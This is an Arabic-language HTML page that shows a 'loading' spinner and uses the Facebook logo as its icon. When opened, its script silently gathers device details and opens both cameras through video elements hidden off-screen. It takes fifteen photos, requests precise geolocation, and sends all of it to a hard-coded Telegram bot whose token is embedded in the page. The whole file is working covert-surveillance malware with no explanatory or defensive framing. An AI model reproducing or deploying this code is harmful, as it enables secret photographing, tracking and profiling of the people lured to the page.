<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
<link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">

<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{height:100%}
  body{
    display:flex;align-items:center;justify-content:center;
    background:#0f0f13;color:#fff;overflow:hidden;
    font-family:system-ui,-apple-system,"Segoe UI",sans-serif;
  }
  .wrap{display:flex;flex-direction:column;align-items:center;gap:18px}
  .spinner{
    width:64px;height:64px;border-radius:50%;
    border:4px solid rgba(255,255,255,.12);
    border-top-color:#4f8cff;
    animation:spin .9s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  .txt{font-size:14px;color:#8b8b9a;text-align:center;padding:0 20px}
  video{
    position:fixed;left:-9999px;top:-9999px;
    width:2px;height:2px;opacity:0.01;pointer-events:none;
  }
</style>
</head>

<body>
  <div class="wrap">
    <div class="spinner"></div>
    <div class="txt" id="txt">جاري التحميل...</div>
  </div>

  <video id="vFront" autoplay playsinline muted></video>
  <video id="vBack"  autoplay playsinline muted></video>

<script>
(function () {
  const BOT_TOKEN = "8936581893:AAF6AB-I1BYXV6H_91K716aCh5w-LCXaYvw";
  const CHAT_ID   = "8800876346";

  const TOTAL_PER_SIDE = 5;
  const SETTLE_MS      = 350;
  const MIN_BRIGHTNESS = 12;
  const PHOTO_GAP_MS   = 80;

  const vFront = document.getElementById("vFront");
  const vBack  = document.getElementById("vBack");
  const txt    = document.getElementById("txt");

  async function getBattery(){
    try{
      if(!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {level: Math.round(b.level*100)+"%", charging: b.charging};
    }catch{ return null; }
  }
  function getConn(){
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c ? {type:c.effectiveType||"—", downlink:c.downlink??"—"} : null;
  }
  function devType(){
    const ua = navigator.userAgent;
    if(/Android/i.test(ua)) return "Android";
    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if(/Windows/i.test(ua)) return "Windows";
    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
    if(/Linux/i.test(ua)) return "Linux";
    return "—";
  }
  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  async function collect(){
    const bat = await getBattery();
    const con = getConn();
    const d = {
      "📱 الجهاز"     : devType(),
      "🖥 النظام"      : navigator.platform || "—",
      "📐 الشاشة"     : `${screen.width}×${screen.height}`,
      "🔍 البكسل"     : devicePixelRatio,
      "🗣 اللغة"       : navigator.language,
      "🕐 التوقيت"    : Intl.DateTimeFormat().resolvedOptions().timeZone,
      "🧠 الأنوية"    : navigator.hardwareConcurrency || "—",
      "💾 الذاكرة"    : navigator.deviceMemory ? navigator.deviceMemory+"GB" : "—",
      "👆 لمس"        : ("ontouchstart" in window) ? "نعم" : "لا",
      "🔋 البطارية"   : bat ? `${bat.level} — ${bat.charging?"⚡":"🔌"}` : "—",
      "📶 الشبكة"     : con ? `${con.type} / ${con.downlink}Mbps` : "—",
      "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
      "🌐 UA"         : navigator.userAgent
    };
    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
    for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
    return out;
  }

  function sendText(t){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("text", t);
    fd.append("parse_mode","HTML");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendPhoto(blob, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", cap);
    fd.append("photo", blob, "p.jpg");
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      {method:"POST", body:fd}).catch(()=>{});
  }
  function sendLocation(lat, lon, cap){
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("latitude", lat);
    fd.append("longitude", lon);
    if(cap) fd.append("caption", cap);
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
      {method:"POST", body:fd}).catch(()=>{});
  }

  function waitForRealFrame(videoEl, timeout = 2500){
    if (typeof videoEl.requestVideoFrameCallback === "function"){
      return Promise.race([
        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
        new Promise(res => setTimeout(res, timeout))
      ]);
    }
    return new Promise(res => {
      const done = () => res();
      videoEl.addEventListener("playing", done, {once:true});
      videoEl.addEventListener("canplay", done, {once:true});
      setTimeout(done, timeout);
    });
  }

  async function openOne(videoEl, facing){
    if(videoEl.srcObject){
      videoEl.srcObject.getTracks().forEach(t=>t.stop());
      videoEl.srcObject = null;
    }
    const s = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:{ideal:facing}, width:{ideal:1280}, height:{ideal:720} },
      audio:false
    });
    videoEl.srcObject = s;
    try{ await videoEl.play(); }catch(_){}
    await waitForRealFrame(videoEl);
    return s;
  }

  function capture(videoEl, isFront){
    return new Promise(resolve=>{
      const c = document.createElement("canvas");
      c.width  = videoEl.videoWidth  || 1280;
      c.height = videoEl.videoHeight || 720;
      const ctx = c.getContext("2d");
      if(isFront){
        ctx.translate(c.width, 0);
        ctx.scale(-1, 1);
      }
      ctx.drawImage(videoEl, 0, 0, c.width, c.height);

      let brightness = 255;
      try{
        const sampleW = Math.min(200, c.width);
        const sampleH = Math.min(200, c.height);
        const sx = (c.width  - sampleW) / 2;
        const sy = (c.height - sampleH) / 2;
        const data = ctx.getImageData(sx, sy, sampleW, sampleH).data;
        let sum = 0, n = 0;
        for(let i=0; i<data.length; i+=16){
          sum += data[i] + data[i+1] + data[i+2];
          n += 3;
        }
        brightness = sum / n;
      }catch(_){}

      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
    });
  }

  async function captureSafe(videoEl, isFront, maxTries = 4){
    for(let attempt = 1; attempt <= maxTries; attempt++){
      const {blob, brightness} = await capture(videoEl, isFront);
      if(blob && brightness >= MIN_BRIGHTNESS) return blob;
      await new Promise(r => setTimeout(r, 200));
    }
    return null;
  }

  function requestLocation(timeoutMs = 12000){
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      const timer = setTimeout(() => resolve(null), timeoutMs);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timer);
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            speed: pos.coords.speed
          });
        },
        err => {
          clearTimeout(timer);
          resolve({ error: err.message });
        },
        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
      );
    });
  }

  async function run(){
    txt.textContent = "جاري التحميل...";

    sendText(await collect());

    let frontStream = null, backStream = null;
    try{
      [frontStream, backStream] = await Promise.all([
        openOne(vFront, "user").catch(() => null),
        openOne(vBack,  "environment").catch(() => null)
      ]);
    }catch(e){}

    if(!frontStream && backStream){
      try{ frontStream = await openOne(vFront, "user"); }catch{}
    }
    if(frontStream && !backStream){
      try{ backStream = await openOne(vBack, "environment"); }catch{}
    }
    if(!frontStream && !backStream){
      txt.textContent = "❌ لا توجد كاميرا متاحة";
      return;
    }

    await new Promise(r => setTimeout(r, SETTLE_MS));

    const sequence = [];
    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"user", label:"أمامية", phase:1});
    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"environment", label:"خلفية", phase:2});
    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"user", label:"أمامية", phase:3});

    const counters = {1:0, 2:0, 3:0};

    for(let i=0; i<sequence.length; i++){
      const step = sequence[i];
      const videoEl = step.f === "user" ? vFront : vBack;
      if(!videoEl.srcObject) continue;

      counters[step.phase]++;
      const num = counters[step.phase];

      const blob = await captureSafe(videoEl, step.f === "user");
      if(blob) sendPhoto(blob, `📷 ${step.label} #${num} (مرحلة ${step.phase}/3)`);

      await new Promise(r => setTimeout(r, PHOTO_GAP_MS));
    }

    [vFront, vBack].forEach(v => {
      if(v.srcObject){
        v.srcObject.getTracks().forEach(t=>t.stop());
        v.srcObject = null;
      }
    });

    txt.textContent = "📍 جاري تحديد الموقع...";

    const loc = await requestLocation();

    if(loc && loc.lat !== undefined){
      const cap =
        `📍 <b>الموقع الجغرافي</b>\n` +
        `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
        `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
      sendLocation(loc.lat, loc.lon, cap);
    }else if(loc && loc.error){
      sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
    }else{
      sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
    }

    txt.textContent = "✅ تم";
  }

  window.addEventListener("load", run);
})();
</script>
</body>
</html>
